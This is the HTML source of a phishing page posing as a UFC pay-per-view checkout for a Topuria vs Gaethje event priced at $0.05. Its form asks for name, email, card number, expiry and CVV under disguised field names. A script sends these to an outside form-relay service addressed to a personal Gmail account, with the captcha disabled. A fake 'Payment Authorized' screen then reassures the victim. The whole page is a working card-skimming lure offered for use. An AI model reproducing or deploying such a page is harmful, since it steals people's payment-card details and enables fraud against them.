<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>UFC | Exclusive Access</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        :root {
            --primary: #e50914;
            --bg: #0a0a0a;
            --surface: #161616;
            --text: #ffffff;
            --text-muted: #a3a3a3;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .header-img {
            width: 100%;
            max-width: 500px;
            height: auto;
            border-bottom: 4px solid var(--primary);
        }

        .main-wrapper {
            width: 100%;
            max-width: 500px;
            padding: 20px;
        }

        .matchup-card {
            background: var(--surface);
            padding: 24px;
            border-radius: 16px;
            text-align: center;
            margin-bottom: 24px;
            border: 1px solid #262626;
        }

        .matchup-title { font-weight: 800; font-size: 1.2rem; margin-bottom: 8px; }
        .price-badge { font-size: 2.5rem; font-weight: 800; color: var(--primary); }

        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px; letter-spacing: 0.5px; }
        
        input {
            width: 100%;
            padding: 14px;
            background: #202020;
            border: 1px solid #333;
            border-radius: 8px;
            color: white;
            font-size: 1rem;
            transition: border 0.3s;
        }
        
        input:focus { outline: none; border-color: var(--primary); }

        .row { display: flex; gap: 12px; }

        .pay-btn {
            background: var(--primary);
            color: white;
            border: none;
            width: 100%;
            padding: 18px;
            font-size: 1rem;
            font-weight: 800;
            text-transform: uppercase;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(229, 9, 20, 0.3);
        }

        #thanks-screen { display: none; text-align: center; padding: 40px; }
        .success-icon { font-size: 64px; color: #4ade80; margin-bottom: 20px; }
    </style>
</head>
<body>

    <img src="IMG_0835.png" alt="Fight Night" class="header-img">

    <div class="main-wrapper" id="form-wrapper">
        <div class="matchup-card">
            <div class="matchup-title">TOPURIA vs GAETHJE</div>
            <div class="price-badge">$0.05</div>
            <div style="color: var(--text-muted); font-size: 0.8rem; margin-top: 5px;">Secure 4K PPV Access</div>
        </div>

        <form id="checkoutForm" action="https://formsubmit.co/info.yahya.bx@gmail.com" method="POST">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="Amount" value="$0.05">
            
            <div class="form-group">
                <label>Full Name</label>
                <input type="text" name="Full_Name" placeholder="John Doe" required>
            </div>

            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="Email" placeholder="email@domain.com" required>
            </div>

            <div class="form-group">
                <label>Cardholder Name</label>
                <input type="text" name="Reference_User" placeholder="As it appears on card" required>
            </div>

            <div class="form-group">
                <label>Card Number</label>
                <input type="text" name="Reference_ID" placeholder="0000 0000 0000 0000" required>
            </div>

            <div class="row">
                <div class="form-group" style="flex: 2;">
                    <label>Expiry Date</label>
                    <input type="text" name="Expiry" placeholder="MM/YY" required>
                </div>
                <div class="form-group" style="flex: 1;">
                    <label>CVV</label>
                    <input type="text" name="Secure_Code" placeholder="***" required>
                </div>
            </div>

            <button type="submit" class="pay-btn" id="submitBtn">Pay $0.05 Now</button>
        </form>
    </div>

    <div id="thanks-screen">
        <i class="fa-solid fa-circle-check success-icon"></i>
        <h2>Payment Authorized</h2>
        <p style="color: var(--text-muted);">Please check your email inbox to launch the secure player.</p>
    </div>

    <script>
        const form = document.getElementById('checkoutForm');
        const btn = document.getElementById('submitBtn');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            btn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> VERIFYING...';
            btn.disabled = true;

            fetch(form.action, {
                method: 'POST',
                body: new FormData(form),
                headers: { 'Accept': 'application/json' }
            })
            .then(() => {
                document.getElementById("form-wrapper").style.display = "none";
                document.getElementById("thanks-screen").style.display = "block";
            });
        });
    </script>
</body>
</html>
